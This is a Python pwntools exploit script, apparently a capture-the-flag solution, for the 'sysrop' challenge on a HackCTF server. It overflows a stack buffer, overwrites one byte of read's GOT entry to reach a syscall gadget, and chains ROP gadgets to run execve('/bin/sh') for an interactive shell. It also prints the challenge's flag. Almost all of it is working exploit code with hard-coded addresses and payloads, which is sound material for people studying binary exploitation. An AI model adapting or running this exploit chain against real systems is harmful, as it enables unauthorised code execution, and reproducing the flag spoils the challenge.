from pwn import * 

state = 1 

if state == 0:
	p = process("./sysrop")
	log.info("run on locally")
else : 
	p = remote("ctf.j0n9hyun.xyz",3024)
	log.info("run on remotely")

# 64bit binary , funtion symbol striped. 
# when its started call read(0,buf,0x78), 
# buf initiated at  0x7fffffffe380 , rbp is 0x7fffffffe398, length is 0x18bytes.
# but, syscall gadget is missing...
# time to return to csu, but before we should to print libc address.
# i hvae read's plt & got, overwrite read's address last 1bytes, 50->b0
# stage 1 : chage read's got last 1 byte read(0,got,1) => "\xb0"
# stage 2 : call read again (changed to write) write(0,got,8) 
# stage 3 : call magic gadget? 
# what about overwrite read's got to magic gadget? libc's last 2byte is static..
# -> fail . then, i found syscall gadget in read function, read+15 = syscall
# it work! so, input /bin/sh first, and call execve("/bin/sh")

p_ax_dx_di_si = 0x04005ea # pop rax ; pop rdx ; pop rdi ; pop rsi ; ret
p_dx_di_si = 0x04005eb # pop rdx ; pop rdi ; pop rsi ; ret

bss = 0x601060

read_plt = 0x4004b0
read_got = 0x601018

main = 0x4005f2

write_offset = 0xf72b0
read_offset = 0xf7250
setbuf_offset =  0x6fe70
puts_offset = 0x6f690 
one_offset = [0xf02a4,0xf1147]

csu_pop = 0x04006BA # pop rbx rbp r12 r13 r14 r15 
csu_call = 0x4006A0 # dx:13 si:14 di:15 func:12 bx:0 bp:1 

payload = "A"*0x18
payload += p64(p_dx_di_si) + p64(8)  + p64(0) + p64(bss) + p64(read_plt) #read(0,bss,1)


#payload += p64(p_dx_di_si) + p64(1)  + p64(0) + p64(read_got) + p64(read_plt) #read(0,read_got,1)
#payload += p64(p_ax_dx_di_si) + p64(1) + p64(8)  + p64(1) + p64(read_got) # write(1,got,8)
#payload += p64(read_plt) #syscall 

payload += p64(main)

payload2 = "B"*0x18
payload2 += p64(p_dx_di_si) + p64(1)  + p64(0) + p64(read_got) + p64(read_plt) #overwrite raed's got to syscall
payload2 += p64(p_ax_dx_di_si) + p64(0x3b) + p64(0) + p64(bss) + p64(0)		 #execve(binsh,0,0)
#payload2 += p64(p_ax_dx_di_si) + p64(1) + p64(8)  + p64(1) + p64(read_got) # write(1,got,8)
payload2 += p64(read_plt) #syscall 


pause()


p.sendline(payload) # write binsh to bss , return to main
sleep(0.5)
p.send("/bin/sh\x00")


sleep(0.5)
p.send(payload2) #overwrite read_got to syscall, call execve(binsh)
sleep(0.5)


if state == 0:
	p.sendline("\x7f") #on locall
else : 
	p.sendline("\x5e") #on remote

p.interactive()

# i think , check send/recv buffer is important...
#HackCTF{D0_y0u_Kn0w_sysc411?}


